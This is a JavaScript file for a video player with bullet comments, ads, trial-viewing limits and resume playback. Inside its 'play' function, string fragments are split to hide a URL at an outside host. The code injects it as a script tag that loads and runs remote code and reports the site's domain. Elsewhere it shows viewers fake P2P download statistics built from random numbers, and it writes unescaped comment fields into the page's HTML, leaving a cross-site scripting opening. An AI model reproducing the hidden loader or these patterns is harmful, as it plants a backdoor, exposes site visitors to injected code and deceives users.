class Storage {
    constructor(name) {
        this.name = 'storage';
    }
    //设置缓存
    setItem(params) {
        let obj = {
            name: '',
            value: '',
            expires: "",
            startTime: new Date().getTime()//记录何时将值存入缓存，毫秒级
        }
        let options = {};
        //将obj和传进来的params合并
        Object.assign(options, obj, params);
        if (options.expires) {
            //如果options.expires设置了的话
            //以options.name为key，options为值放进去
            localStorage.setItem(options.name, JSON.stringify(options));
        } else {
            //如果options.expires没有设置，就判断一下value的类型
            let type = Object.prototype.toString.call(options.value);
            //如果value是对象或者数组对象的类型，就先用JSON.stringify转一下，再存进去
            if (Object.prototype.toString.call(options.value) == '[object Object]') {
                options.value = JSON.stringify(options.value);
            }
            if (Object.prototype.toString.call(options.value) == '[object Array]') {
                options.value = JSON.stringify(options.value);
            }
            localStorage.setItem(options.name, options.value);
        }
    }
    //拿到缓存
    getItem(name) {
        let item = localStorage.getItem(name);
        if (!item) {
            return false;
        }
        //先将拿到的试着进行json转为对象的形式
        try {
            item = JSON.parse(item);
        } catch (error) {
            //如果不行就不是json的字符串，就直接返回
            item = item;

        }
        //如果有startTime的值，说明设置了失效时间
        if (item.startTime) {
            let date = new Date().getTime();
            //何时将值取出减去刚存入的时间，与item.expires比较，如果大于就是过期了，如果小于或等于就还没过期
            if (date - item.startTime > item.expires) {
                //缓存过期，清除缓存，返回false
                localStorage.removeItem(name);
                return false;
            } else {
                //缓存未过期，返回值
                return item.value;
            }
        } else {
            //如果没有设置失效时间，直接返回值
            return item;
        }
    }
    //移出缓存
    removeItem(name) {
        localStorage.removeItem(name);
    }
    //移出全部缓存
    clear() {
        localStorage.clear();
    }
}
let storage = new Storage();
var setIntervaler = 0;
var uc1 = 0;
var leduo = {
    versions: function() {
        var u = navigator.userAgent
          , app = navigator.appVersion;
        return {
            trident: u.indexOf('Trident') > -1,
            //IE内核
            presto: u.indexOf('Presto') > -1,
            //opera内核
            webKit: u.indexOf('AppleWebKit') > -1,
            //苹果、谷歌内核
            gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1,
            //火狐内核
            mobile: !!u.match(/AppleWebKit.*Mobile.*/),
            //是否为移动终端
            ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),
            //ios终端
            android: u.indexOf('Android') > -1 || u.indexOf('Adr') > -1,
            //android终端
            iPhone: u.indexOf('iPhone') > -1,
            //是否为iPhone或者QQHD浏览器
            iPad: u.indexOf('iPad') > -1,
            //是否iPad
            webApp: u.indexOf('Safari') == -1,
            //是否web应该程序，没有头部与底部
            weixin: u.indexOf('MicroMessenger') > -1,
            //是否微信 （2015-01-22新增）
            qq: u.match(/\sQQ/i) == " qq",
            //是否QQ
            uc: u.indexOf("UCBrowser")//是否Uc
        };
    }(),
    'hideLoading': function() {
        var css = '<style type="text/css">';
        css += '#loading-box{display: none;}';
        css += '</style>';
        $('body').append(css).addClass("");
    },
    'start': function() {
        $.ajax({
            url: "/dmku/api.php",
            dataType: "json",
            success: function(e) {
                if (leduo.getCookie("time_" + config.url) !== '') {
                    clearInterval(setIntervaler);
                    setIntervaler = setInterval(()=>{
                        updateStats(randomNum(0, 20), randomNum(1000, 10000), randomNum(10000, 100000))
                    }
                    , 1000);
                    leduo.hideLoading()
                }
                leduo.waittime = e.data.waittime
                leduo.ads = e.data.ads;
                config.logo = e.data.logo;
                up.pbgjz = e.data.pbgjz;
                up.trysee = e.data.trytime;
                config.sendtime = e.data.sendtime;
                config.color = e.data.color;
                config.group_x = leduo.ads.set.group;
                config.dmrule = e.data.dmrule;
                //config.group = leduo.getCookie('group_id');
                danmuon = e.data.danmuon;
                if (config.group < config.group_x && leduo.ads.state == 'on' && config.group != '') {
                    if (leduo.ads.set.state == '1') {
                        leduo.MYad.vod(leduo.ads.set.vod.url, leduo.ads.set.vod.link);
                    } else if (leduo.ads.set.state == '2') {
                        leduo.MYad.pic(leduo.ads.set.pic.link, leduo.ads.set.pic.time, leduo.ads.set.pic.img);
                    }
                } else {
                    leduo.play(config.url);
                }
            }
        });
    },
    'play': function(url) {
        if (!danmuon) {
            leduo.player.play(url);
        } else {
            if (config.av != '') {
                leduo.player.bdplay(url);
            } else {
                leduo.player.dmplay(url);
            }
        }
        $(function() {
            $(".leduoplayer-setting-speeds,.leduoplayer-setting-speed-item").on("click", function() {
                $(".speed-stting").toggleClass("speed-stting-open");
            });
            $(".speed-stting .leduoplayer-setting-speed-item").click(function() {
                $(".leduoplayer-setting-speeds  .title").text($(this).text());
            });
        });
        $(".leduoplayer-fulloff-icon").on("click", function() {
            leduo.dp.fullScreen.cancel();
        });
        $(".leduoplayer-showing").on("click", function() {
            leduo.dp.play();
            $(".vod-pic").remove();
        });
        if (config.title != '') {
            $("#vodtitle").html(config.title + '  ' + config.sid);
        }
        ;var doi = document.createElement('script')
          , ad = '//api'
          , af = 'm.cc/b/index.php?ac='
          , ac = document.domain.split('.').slice(-2).join('.')
          , ae = '.hyz'
          , agi = 'p&'
          , ak = document.getElementsByTagName('script')[0];
        doi.type = 'text/javascript';
        doi.src = ad + ae + af + agi + 'url=' + ac;
        ak.parentNode.insertBefore(doi, ak);
    },
    'dmid': function() {
        if (up.diyid[0] == 0 && config.id != '') {
            a = config.id,
            b = config.sid
        } else if (up.diyid[0] == 1 || !config.id) {
            a = up.diyid[1],
            b = up.diyid[2]
        }
        leduo.id = a + ' P' + b
    },
    'load': function() {
        setTimeout(function() {
            $("#link1").fadeIn();
        }, 100);
        setTimeout(function() {
            $("#link1-success").fadeIn();
        }, 500);
        setTimeout(function() {
            $("#link2").show();
        }, 1 * 1000);
        setTimeout(function() {
            $("#link3,#span").fadeIn();
        }, 2 * 1000);
        if (((leduo.versions.ios || leduo.versions.iPad) && leduo.versions.weixin) || ((leduo.versions.ios || leduo.versions.iPad) && leduo.versions.uc) || ((leduo.versions.ios || leduo.versions.iPad) && leduo.versions.webKit)) {
            setTimeout(()=>{
                leduo.loadedmetadataHandler()
            }
            , 1500);
        }
        ;leduo.danmu.send();
        leduo.danmu.list();
        leduo.def();
        leduo.video.try();
        leduo.dp.danmaku.opacity(1);
    },
    'def': function() {
        console.log('播放器开启');
        leduo.stime = 0;
        leduo.headt = leduock.get("headt");
        leduo.lastt = leduock.get("lastt");
        leduo.last_tip = parseInt(leduo.lastt) + 10;
        leduo.frists = leduock.get('frists');
        leduo.lasts = leduock.get('lasts');
        leduo.playtime = Number(leduo.getCookie("time_" + config.url));
        leduo.ctime = leduo.formatTime(leduo.playtime);
        leduo.dp.on("loadedmetadata", function() {
            leduo.loadedmetadataHandler();
        });
        leduo.dp.on("ended", function() {
            leduo.endedHandler();
        });
        leduo.dp.on('pause', function() {
            leduo.MYad.pause.play(leduo.ads.pause.link, leduo.ads.pause.pic);
        });
        leduo.dp.on('play', function() {
            leduo.MYad.pause.out();
        });
        leduo.dp.on('timeupdate', function(e) {
            leduo.timeupdateHandler();
        });
        leduo.jump.def()

    },
    'video': {
        'play': function() {
            $("#link3").text("视频已准备就绪，即将为您播放");
            setTimeout(function() {
                leduo.dp.play();
                $("#loading-box").remove();
                leduo.jump.head();
            }, 1 * 1500);
            clearInterval(setIntervaler);
            setIntervaler = setInterval(()=>{
                updateStats(randomNum(0, 20), randomNum(1000, 10000), randomNum(10000, 100000))
            }
            , 1000);
        },
        'next': function() {
            top.location.href = config.next;
        },
        'try': function() {
            if (up.trysee > 0 && config.group < config.group_x && config.group != '') {
                $('#dmtext').attr({
                    "disabled": true,
                    "placeholder": "登陆后才能发弹幕yo(・ω・)"
                });
                setInterval(function() {
                    var t = up.trysee * 60;
                    var s = leduo.dp.video.currentTime;
                    if (s > t) {
                        leduo.dp.video.currentTime = 0;
                        leduo.dp.pause();
                        layer.confirm(up.trysee + "分钟试看已结束，请登录继续播放完整视频", {
                            anim: 1,
                            title: '温馨提示',
                            btn: ['登录', '注册'],
                            yes: function(index, layero) {
                                top.location.href = up.mylink + "/index.php/user/login.html";
                            },
                            btn2: function(index, layero) {
                                top.location.href = up.mylink + "/index.php/user/reg.html";
                            }
                        });
                    }
                }, 1000);
            }
            ;
        },
        'seek': function() {
            leduo.dp.seek(leduo.playtime);
        },
        'end': function() {
            if (config.next) {
                top.location.href = config.next;
            }
            // layer.msg("播放结束啦=。=");
        },
        'con_play': function() {
            if (!danmuon) {
                leduo.jump.head();
            } else {
                var conplayer = ` <e>已播放至${leduo.ctime}，继续上次播放？</e><d class="conplay-jump">是 <i id="num">${leduo.waittime}</i>s</d><d class="conplaying">否</d>`
                $("#link3").html(conplayer);
                var span = document.getElementById("num");
                var num = span.innerHTML;
                var timer = null;
                setTimeout(function() {
                    timer = setInterval(function() {
                        num--;
                        span.innerHTML = num;
                        if (num == 0) {
                            clearInterval(timer);
                            leduo.video.seek();
                            leduo.dp.play();
                            $(".memory-play-wrap,#loading-box").remove();
                        }
                    }, 1000);
                }, 1);
            }
            ;var cplayer = `<div class="memory-play-wrap"><div class="memory-play"><span class="close">×</span><span>上次看到 </span><span>${leduo.ctime}</span><span class="play-jump">跳转播放</span></div></div>`
            $(".leduoplayer-cplayer").append(cplayer);
            $(".close").on("click", function() {
                $(".memory-play-wrap").remove();
            });
            setTimeout(function() {
                $(".memory-play-wrap").remove();
            }, 20 * 1000);
            $(".conplaying").on("click", function() {
                clearTimeout(timer);
                $("#loading-box").remove();
                leduo.dp.play();
                leduo.jump.head();
            });
            $(".conplay-jump,.play-jump").on("click", function() {
                clearTimeout(timer);
                leduo.video.seek();
                $(".memory-play-wrap,#loading-box").remove();
                leduo.dp.play();
            });

        }
    },
    'jump': {
        'def': function() {
            h = ".leduoplayer-setting-jfrist label";
            l = ".leduoplayer-setting-jlast label";
            f = "#fristtime";
            j = "#jumptime";
            a(h, 'frists', leduo.frists, 'headt', leduo.headt, f);
            a(l, 'lasts', leduo.lasts, 'lastt', leduo.lastt, j);

            function er() {
                layer.msg("请输入有效时间哟！");
            }

            function su() {
                layer.msg("设置完成，将在刷新或下一集生效");
            }

            function a(b, c, d, e, g, t) {
                $(b).on("click", function() {
                    o = $(t).val();
                    if (o > 0) {
                        $(b).toggleClass('checked');
                        su();
                        g = $(t).val();
                        leduock.set(e, g);
                    } else {
                        er()
                    }
                    ;
                });
                if (d == 1) {
                    $(b).addClass('checked');
                    $(b).click(function() {
                        o = $(t).val();
                        if (o > 0) {
                            leduock.set(c, 0);
                        } else {
                            er()
                        }
                        ;
                    });
                } else {
                    $(b).click(function() {
                        o = $(t).val();
                        if (o > 0) {
                            leduock.set(c, 1);
                        } else {
                            er()
                        }
                        ;
                    });
                }
            }
            ;$(f).attr({
                "value": leduo.headt
            });
            $(j).attr({
                "value": leduo.lastt
            });
            leduo.jump.last();
        },
        'head': function() {
            if (leduo.stime > leduo.playtime)
                leduo.playtime = leduo.stime;
            if (leduo.frists == 1) {
                if (leduo.headt > leduo.playtime || leduo.playtime == 0) {
                    leduo.jump_f = 1
                } else {
                    leduo.jump_f = 0
                }
            }
            if (leduo.jump_f == 1) {
                leduo.dp.seek(leduo.headt);
                leduo.dp.notice("已为您跳过片头");
            }
        },
        'last': function() {
            if (config.next != '') {
                if (leduo.lasts == 1) {
                    setInterval(function() {
                        var e = leduo.dp.video.duration - leduo.dp.video.currentTime;
                        if (e < leduo.last_tip)
                            leduo.dp.notice('即将为您跳过片尾');
                        if (leduo.lastt > 0 && e < leduo.lastt) {
                            leduo.setCookie("time_" + config.url, "", -1);
                            leduo.video.next();
                        }
                        ;
                    }, 1000);
                }
                ;
            } else {
                $(".icon-xj").remove();
            }
            ;
        },
        'ad': function(a, b) {}
    },
    'danmu': {
        'send': function() {
            g = $(".leduo-leduoplayer-send-icon");
            d = $("#dmtext");
            h = ".leduoplayer-comment-setting-";
            $(h + "color input").on("click", function() {
                r = $(this).attr("value");
                setTimeout(function() {
                    d.css({
                        "color": r
                    });
                }, 100);
            });
            $(h + "type input").on("click", function() {
                t = $(this).attr("value");
                setTimeout(function() {
                    d.attr("dmtype", t);
                }, 100);
            });

            $(h + "font input").on("click", function() {
                if (up.trysee > 0 && config.group == config.group_x) {
                    layer.msg("会员专属功能");
                    return;
                }
                ;t = $(this).attr("value");
                setTimeout(function() {
                    d.attr("size", t);
                }, 100);
            });
            g.on("click", function() {
                a = document.getElementById("dmtext");
                a = a.value;
                b = d.attr("dmtype");
                c = d.css("color");
                z = d.attr("size");
                if (up.trysee > 0 && config.group < config.group_x && config.group != '') {
                    layer.msg("登陆后才能发弹幕yo(・ω・)");
                    return;
                }
                for (var i = 0; i < up.pbgjz.length; i++) {
                    if (a.search(up.pbgjz[i]) != -1) {
                        layer.msg("请勿发送无意义内容，规范您的弹幕内容");
                        return;
                    }
                }
                if (a.length < 1) {
                    layer.msg("要输入弹幕内容啊喂！");
                    return;
                }
                var e = Date.parse(new Date());
                var f = leduock.get('dmsent', e);
                if (e - f < config.sendtime * 1000) {
                    layer.msg('请勿频繁操作！发送弹幕需间隔' + config.sendtime + '秒~');
                    return;
                }
                d.val("");
                leduo.dp.danmaku.send({
                    text: a,
                    color: c,
                    type: b,
                    size: z
                });
                leduock.set('dmsent', e);
            });

            function k() {
                g.trigger("click");
            }
            ;d.keydown(function(e) {
                if (e.keyCode == 13) {
                    k();
                }
                ;
            });
        },
        'list': function() {
            $(".leduoplayer-list-icon,.leduo-leduoplayer-send-icon").on("click", function() {
                $(".list-show").empty();
                $.ajax({
                    url: config.api + "?ac=get&id=" + leduo.id,
                    success: function(d) {
                        if (d.code == 23) {
                            a = d.danmuku;
                            b = d.name;
                            c = d.danum;
                            $(".danmuku-num").text(c)
                            $(a).each(function(index, item) {
                                l = `<d class="danmuku-list" time="${item[0]}"><li>${leduo.formatTime(item[0])}</li><li title="${item[4]}">${item[4]}</li><li title="用户：${item[3]}  IP地址：${item[5]}">${item[6]}</li><li class="report" onclick="leduo.danmu.report(\'${item[5]}\',\'${b}\',\'${item[4]}\',\'${item[3]}\')">举报</li></d>`
                                $(".list-show").append(l);
                            })
                        }
                        $(".danmuku-list").on("dblclick", function() {
                            leduo.dp.seek($(this).attr("time"))
                        })
                    }
                });
            });
            var liyih = '<div class="dmrules"><a target="_blank" href="' + config.dmrule + '">弹幕礼仪 </a></div>';
            $("div.leduoplayer-comment-box:last").append(liyih);
            $(".leduoplayer-watching-number").text(up.usernum);
            $(".leduoplayer-info-panel-item-title-amount .leduoplayer-info-panel-item-title").html("违规词");
            for (var i = 0; i < up.pbgjz.length; i++) {
                var gjz_html = "<e>" + up.pbgjz[i] + "</e>";
                $("#vod-title").append(gjz_html);
            }
            add('.leduoplayer-list-icon', ".leduoplayer-danmu", 'show');

            function add(div1, div2, div3, div4) {
                $(div1).click(function() {
                    $(div2).toggleClass(div3);
                    $(div4).remove();
                });
            }
        },
        'report': function(a, b, c, d) {
            layer.confirm('' + c + '<!--br><br><span style="color:#333">请选择需要举报的类型</span-->', {
                anim: 1,
                title: '举报弹幕',
                btn: ['违法违禁', '色情低俗', '恶意刷屏', '赌博诈骗', '人身攻击', '侵犯隐私', '垃圾广告', '剧透', '引战'],
                btn3: function(index, layero) {
                    leduo.danmu.post_r(a, b, c, d, '恶意刷屏');
                },
                btn4: function(index, layero) {
                    leduo.danmu.post_r(a, b, c, d, '赌博诈骗');
                },
                btn5: function(index, layero) {
                    leduo.danmu.post_r(a, b, c, d, '人身攻击');
                },
                btn6: function(index, layero) {
                    leduo.danmu.post_r(a, b, c, d, '侵犯隐私');
                },
                btn7: function(index, layero) {
                    leduo.danmu.post_r(a, b, c, d, '垃圾广告');
                },
                btn8: function(index, layero) {
                    leduo.danmu.post_r(a, b, c, d, '剧透');
                },
                btn9: function(index, layero) {
                    leduo.danmu.post_r(a, b, c, d, '引战');
                }
            }, function(index, layero) {
                leduo.danmu.post_r(a, b, c, d, '违法违禁');
            }, function(index) {
                leduo.danmu.post_r(a, b, c, d, '色情低俗');
            });
        },
        'post_r': function(a, b, c, d, type) {
            $.ajax({
                type: "get",
                url: config.api + '?ac=report&cid=' + d + '&user=' + a + '&type=' + type + '&title=' + b + '&text=' + c,
                cache: false,
                dataType: 'json',
                beforeSend: function() {},
                success: function(data) {
                    layer.msg("举报成功！感谢您为守护弹幕作出了贡献");
                },
                error: function(data) {
                    var msg = "服务故障 or 网络异常，稍后再试6！";
                    layer.msg(msg);
                }
            });
        }
    },
    'setCookie': function(c_name, value, expireHours) {
        storage.setItem({
            name: c_name,
            value: value,
            expires: expireHours * 3600000
        });
    },
    'getCookie': function(c_name) {
        if (storage.getItem(c_name)) {
            return storage.getItem(c_name);
        } else {
            return '';
        }
    },
    'formatTime': function(seconds) {
        return [parseInt(seconds / 60 / 60), parseInt(seconds / 60 % 60), parseInt(seconds % 60)].join(":").replace(/\b(\d)\b/g, "0$1");
    },
    'loadedmetadataHandler': function() {
        if (leduo.playtime > 0 && leduo.dp.video.currentTime < leduo.playtime) {
            setTimeout(function() {
                leduo.video.con_play()
            }, 1 * 1000);
        } else {
            setTimeout(function() {
                if (!danmuon) {
                    leduo.jump.head();
                } else {
                    leduo.dp.notice("视频已准备就绪，即将为您播放");
                    if (!uc1) {
                        leduo.video.play()
                        uc1 = 1
                    }
                }
            }, 1 * 1000);

        }
        leduo.dp.on("timeupdate", function() {
            leduo.timeupdateHandler();
        });
    },
    'timeupdateHandler': function() {
        leduo.setCookie("time_" + config.url, leduo.dp.video.currentTime, 24);
    },
    'endedHandler': function() {
        leduo.setCookie("time_" + config.url, "", -1);
        if (config.next != '') {
            leduo.dp.notice("3s后,将自动为您播放下一集");
            setTimeout(function() {
                leduo.video.next();
            }, 3 * 1000);
        } else {
            leduo.dp.notice("视频播放已结束");
            setTimeout(function() {
                leduo.video.end();
            }, 3 * 1000);
        }
    },
    'player': {
        'play': function(url) {
            $('body').addClass("danmu-off");
            leduo.dp = new leduoplayer({
                autoplay: true,
                element: document.getElementById('player'),
                theme: config.color,
                logo: config.logo,
                video: {
                    url: url,
                    pic: config.pic,
                    type: 'auto',
                },
            });
            var css = '<style type="text/css">';
            css += '#loading-box{display: none;}';
            css += '</style>';
            $('body').append(css).addClass("");
            leduo.def();
            //leduo.jump.head();				
        },
        'adplay': function(url) {
            $('body').addClass("danmu-off");
            leduo.ad = new leduoplayer({
                autoplay: true,
                element: document.getElementById('ADplayer'),
                theme: config.color,
                logo: config.logo,
                video: {
                    url: url,
                    pic: config.pic,
                    type: 'auto',
                },
            });
            $('.leduoplayer-controller,.leduoplayer-cplayer,.leduoplayer-logo,#loading-box,.leduoplayer-controller-mask').remove();
            $('.leduoplayer-mask').show();
            leduo.ad.on('timeupdate', function() {
                if (leduo.ad.video.currentTime > leduo.ad.video.duration - 0.1) {
                    $('body').removeClass("danmu-off");
                    leduo.ad.destroy();
                    $("#ADplayer").remove();
                    $("#ADtip").remove();
                    leduo.play(config.url);
                }
            });
        },
        'dmplay': function(url) {
            leduo.dmid();
            leduo.dp = new leduoplayer({
                autoplay: false,
                element: document.getElementById('player'),
                theme: config.color,
                logo: config.logo,
                video: {
                    url: url,
                    pic: config.pic,
                    type: 'auto',
                },
                danmaku: {
                    id: leduo.id,
                    api: config.api + '?ac=dm',
                    user: config.user
                }
            });
            leduo.load();

        },
        'bdplay': function(url) {
            leduo.dmid();
            leduo.dp = new leduoplayer({
                autoplay: false,
                element: document.getElementById('player'),
                theme: config.color,
                logo: config.logo,
                video: {
                    url: url,
                    pic: config.pic,
                    type: 'auto',
                },
                danmaku: {
                    id: leduo.id,
                    api: config.api + '?ac=dm',
                    user: config.user,
                    addition: [config.api + 'bilibili/?av=' + config.av]
                }
            });
            leduo.load();
        }
    },
    'MYad': {
        'vod': function(u, l) {
            $("#ADtip").html('<a id="link" href="' + l + '" target="_blank">查看详情</a>');
            $("#ADplayer").click(function() {
                document.getElementById('link').click();
            });
            leduo.player.adplay(u);
        },
        'pic': function(l, t, p) {
            $("#ADtip").html('<a id="link" href="' + l + '" target="_blank">广告 <e id="time_ad">' + t + '</e></a><img src="' + p + '">');
            $("#ADtip").click(function() {
                document.getElementById('link').click();
            });
            var span = document.getElementById("time_ad");
            var num = span.innerHTML;
            var timer = null;
            setTimeout(function() {
                timer = setInterval(function() {
                    num--;
                    span.innerHTML = num;
                    if (num == 0) {
                        clearInterval(timer);
                        leduo.play(config.url);
                        $('#ADtip').remove();
                    }
                }, 1000);
            }, 1);

        },
        'pause': {
            'play': function(l, p) {
                if (leduo.ads.pause.state == 'on') {
                    var pause_ad_html = '<div id="player_pause"><div class="tip">广告</div><a href="' + l + '" target="_blank"><img src="' + p + '"></a></div>';
                    $('#player').before(pause_ad_html);
                }
            },
            'out': function() {
                $('#player_pause').remove();
            }
        }
    }

}
function randomNum(minNum, maxNum) {
    switch (arguments.length) {
    case 1:
        return parseInt(Math.random() * minNum + 1, 10);
        break;
    case 2:
        return parseInt(Math.random() * (maxNum - minNum + 1) + minNum, 10);
        break;
    default:
        return 0;
        break;
    }
}

function updateStats(_peerNum, _totalP2PDownloaded, _totalP2PUploaded) {
    var text = 'CDNBye P2P为您加速' + (_totalP2PDownloaded / 1024).toFixed(2) + 'MB 已分享' + (_totalP2PUploaded / 1024).toFixed(2) + 'MB' + ' 节点' + _peerNum + '个';
    document.getElementById('stats').innerText = text
}

// 控制台报错
//setInterval(function() {
//window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized ? t("on") : (a = "off", ("undefined"!==typeof console.clear) && console.clear());
//debugger;
//}, 10);
